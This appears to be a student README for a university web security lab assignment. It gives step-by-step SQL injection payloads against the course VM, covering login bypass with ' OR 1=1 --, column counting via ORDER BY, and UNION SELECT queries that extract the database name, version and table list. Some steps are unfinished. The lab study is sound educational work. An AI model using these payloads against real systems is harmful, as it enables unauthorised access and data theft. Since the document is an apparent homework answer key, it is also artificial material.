# MP2 - WebSec
##### Instructor: Adam Bates & Ling Ren
CP1 Deadline --- Wednesday, September 27th, 6:00PM

CP2 Deadline --- Thursday, October 6th, 6:00PM

## Project Setup
1. Download VMWare
2. Download Ubuntu 18.04 LTS (CS461 Virtual Machine) at [here](https://uofi.box.com/s/aqaixm5igvqbyxys7gpswxgcsf7nyqo6)
3. Setup the VM in VMWare 

## Build Project
None

## Implementation
#### 2.2.1.1
Type the following command in `Username`
```
victim
```
Type the following command in `Password`
```
' OR 1=1 -- 
```
#### 2.2.1.2
Type the following command in `Username`
```
victim
```
Type the following command in `Password`
```
\' OR 1=1 -- 
```
#### 2.2.1.3

#### 2.2.1.4
##### 1. Figure out how many columns there are in the table with the following command
```
' OR 1=1 ORDER BY 1; -- 
' OR 1=1 ORDER BY 2; -- 
' OR 1=1 ORDER BY 3; -- 
' OR 1=1 ORDER BY 4; -- 
' OR 1=1 ORDER BY 5; -- 
```
The last command will give you an error. Therefore, there are 4 columns in the table.

##### 2. Use the following command to get the `DataBase Name`
```
' UNION SELECT NULL,NULL,NULL,DATABASE(); -- 
```

##### 3. Use the following command to get the `DataBase Version`
```
' UNION SELECT NULL,NULL,NULL,version(); -- 
```
Or use the following alternative command
```
' UNION SELECT NULL,NULL,NULL,@@version; -- 
```

##### 4. Use the following command to get all `Table` in the DataBase
```
' UNION SELECT NULL,NULL,NULL,GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='proj2_inject3'; --
```

##### 5. NEED 2.2.1.3 HASH to Finish

## Test MP2
Check `MP2 WebSec PDF`

## Developers
* Hongbo Zheng [NetID: hongboz2]
* Max Song [NetID: mcsong2]
